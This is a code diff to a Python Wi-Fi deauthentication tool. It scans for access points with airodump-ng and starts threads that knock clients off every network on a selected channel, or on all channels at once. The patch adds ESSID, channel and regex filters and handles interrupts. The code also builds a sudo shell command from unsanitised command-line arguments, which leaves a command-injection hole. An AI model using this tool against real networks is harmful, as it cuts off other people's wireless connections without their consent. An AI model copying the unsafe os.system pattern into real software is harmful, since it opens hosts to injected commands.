@@ -14,11 +14,22 @@ ans=""
 if not "-s" in args:
     ans = input("would you like to scan for BSSIDs? (Y/n)\n>")
 if ans.lower() in ["","y","yes","ye","ys"] or "-s" in args:
+    command_args=""
+    if "-e" in args:
+        command_args+=f" --essid {args[args.index('-e')+1]}"
+    if "-c" in args:
+        command_args+=f" --channel {args[args.index('-c')+1]}"
+    if "-r" in args:
+        command_args+=f" --essid-regex {args[args.index('-r')+1]}"
     print("Starting airodump-ng to get a list of BSSIDs & channels")
     print("Press Ctrl+C when you are ready to continue")
     countdown_sleep(5,f"Starting airodump on {interface.interface}")
-    os.system(f"sudo airodump-ng {interface.interface} -w BSSIDs --output-format csv")
-    input("Press Enter to continue")
+    os.system(f"sudo airodump-ng {command_args} {interface.interface} -w BSSIDs --output-format csv")
+    try:
+        input("Press Enter to continue")
+    except KeyboardInterrupt:
+        interface.Stop_interface()
+        exit()
     with open("BSSIDs-01.csv","r") as f:
         content = f.read().split("\n")
         whitespace_lines=[]
@@ -50,15 +61,15 @@ try:
         print(f"[{item}] ({common_channels[item] if will_fit(len(str(common_channels[item]))) else len(common_channels[item])})")
     ans = input("Please write the number of the channel you would like to Deauth (leave blank for all)\n>")
     if not ans in common_channels.keys() and not ans:
-        multi_deauth(interface,common_channels)
+        multi_deauth(interface,common_channels,args)
         exit()
     elif ans not in common_channels.keys(): raise Exception("Answer should be blank or a value in common_channels!")
     interface.Start_interface(int(ans))
     threads=0
     for BSSID in common_channels[ans]:
+        threads+=1
         BSSID=bssid(BSSID[0],int(ans))
         Thread = threading.Thread(target=BSSID.Deauth,args=(interface,0))
-        threads+=1
         Thread.start()
     print(f"Started {threads} Threads!")
     while True:
